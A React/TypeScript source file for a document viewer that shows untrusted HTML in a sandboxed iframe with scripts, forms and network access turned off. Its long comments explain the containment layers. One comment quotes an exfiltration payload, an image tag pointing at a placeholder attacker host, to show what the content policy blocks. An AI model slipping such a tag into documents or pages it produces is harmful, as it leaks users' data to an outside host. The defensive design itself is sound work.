'use client';

import type { ReactElement } from 'react';
import type { DocumentContentInfo } from '../graphql/client';

/**
 * The only renderer document CONTENT ever gets (M12) — the `MessageText`
 * obligation, applied to the other untrusted-text surface in the product.
 *
 * ===========================================================================
 * CONTAINMENT, NOT INTERPRETATION
 * ===========================================================================
 *
 * docs/03 risk #6 is about document text being attacker-controlled: an uploaded
 * PDF, a scanned deed, a title somebody else wrote. A generated instrument is a
 * gentler case — its markup comes from a sha256-pinned template and every
 * substituted value is HTML-escaped by the service's own renderer — but the
 * rule this repo settled in M11 does not depend on how gentle the input looks.
 * There is no `dangerouslySetInnerHTML` here (a source scan over the whole app
 * enforces that, with `app/layout.tsx`'s theme script as the single declared
 * exemption), and there is no parser: this component does not read the content,
 * it hands the bytes to the browser inside a boundary.
 *
 * THE BOUNDARY IS THE CONTROL, and it is three layers deep:
 *
 * 1. `sandbox=""` — the empty value is the strictest one. No `allow-scripts`,
 *    so nothing in the document executes; no `allow-same-origin`, so it lands
 *    in an opaque origin with no access to this app's DOM, storage or cookies;
 *    no `allow-forms`, `allow-popups` or `allow-top-navigation`, so it cannot
 *    submit, open or navigate anything. A future edit that adds
 *    `allow-scripts allow-same-origin` together would undo the whole thing,
 *    which is why the value is asserted in this component's own spec.
 * 2. The page's Content-Security-Policy. A `srcdoc` frame inherits the
 *    embedding document's policy, so `img-src 'self' data:` and
 *    `connect-src 'self'` apply INSIDE the frame: an `<img
 *    src="https://attacker/?d=…">` smuggled into document text is refused by
 *    the browser, not by anything we wrote.
 * 3. The `csp` attribute below, which asks for a policy stricter still on the
 *    framed document alone. It is Chromium-only and ignored elsewhere, so it is
 *    defence in depth on top of (1) and (2) rather than the thing being relied
 *    on — stated here so nobody reads it as the control.
 *
 * WHAT THIS COSTS, stated rather than hidden: the document renders with the
 * browser's default styling, because a stylesheet cannot cross the sandbox
 * boundary without loosening it, and the frame cannot size itself to its
 * content because that needs scripting inside it. So it is a fixed-height
 * scrolling region showing exactly the bytes that are stored. That is honest —
 * what you see is the document as it exists — and it is the trade this repo
 * makes every time: the same reasoning that hand-wrote the template renderer,
 * the webhook verifier and the clamd client rather than adding a parser to an
 * untrusted-input path.
 *
 * ONLY HTML IS FRAMED. `encoding: utf8` with `mime: text/html` is what the
 * service returns for a generated instrument, and it is the ONLY content that
 * reaches an iframe here. An upload can never be `text/html` — the ingest
 * pipeline's magic-byte sniff admits pdf/png/jpeg/tiff only — but this
 * component checks anyway rather than trusting that invariant from a distance.
 */

export interface DocumentViewerProps {
  readonly content: DocumentContentInfo;
}

/**
 * The strictest sandbox: an EMPTY attribute grants no capability at all.
 * Extracted as a constant so the spec can assert the exact value rather than
 * matching a substring — `allow-scripts allow-same-origin` would also contain
 * "allow-scripts", and it is the combination that is fatal.
 */
export const VIEWER_SANDBOX = '';

/**
 * Chromium's per-frame policy attribute (layer 3 above). `default-src 'none'`
 * with inline styles permitted: enough for the document's own markup to render,
 * nothing that can reach the network.
 */
export const VIEWER_CSP = "default-src 'none'; style-src 'unsafe-inline'; img-src data:";

export function DocumentViewer({ content }: DocumentViewerProps): ReactElement {
  if (content.mime !== 'text/html' || content.encoding !== 'utf8') {
    // Not a generated instrument. Binary uploads get their own presentation
    // with the upload surface; until then, saying so beats framing bytes the
    // browser would guess at.
    return (
      <div className="rounded-[var(--radius-card)] border border-line p-4" role="status">
        <p className="text-sm font-medium">This version can’t be shown here yet</p>
        <p className="mt-1 text-[0.8125rem] text-ink-muted">
          It was stored as {content.mime}, and only documents generated here can be read in the
          browser so far.
        </p>
      </div>
    );
  }

  return (
    <div>
      <iframe
        title={`Document version ${content.version}`}
        // See the header: text nodes are not an option for a document, so the
        // containment is the frame. Neither of these attributes is decorative.
        sandbox={VIEWER_SANDBOX}
        csp={VIEWER_CSP}
        srcDoc={content.content}
        className="h-[32rem] w-full rounded-[var(--radius-card)] border border-line bg-white"
      />
      <p className="mt-2 text-xs text-ink-muted">
        Shown exactly as stored, in an isolated frame with scripts and network access switched off.
      </p>
    </div>
  );
}
